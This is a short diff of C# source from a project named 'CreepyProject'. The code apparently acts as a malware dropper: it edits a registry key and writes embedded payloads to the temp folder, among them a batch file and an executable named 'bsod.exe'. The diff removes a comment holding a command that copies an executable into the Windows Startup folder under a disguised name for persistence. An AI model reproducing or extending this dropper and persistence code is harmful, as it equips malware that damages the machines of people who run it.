@@ -53,7 +53,7 @@ namespace CreepyProject
             editKey.Close();
 
 
-            System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);//copy %temp%\rniw.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\corra.exe"
+            System.IO.File.WriteAllBytes(temp + "windl.bat", Properties.Resources.windl);
             System.IO.File.WriteAllBytes(temp + "jooj.mp4", Properties.Resources.jooj);
             System.IO.File.WriteAllBytes(temp + "ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf", Properties.Resources.ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA);
             System.IO.File.WriteAllBytes(temp + "bsod.exe", Properties.Resources.cusole);
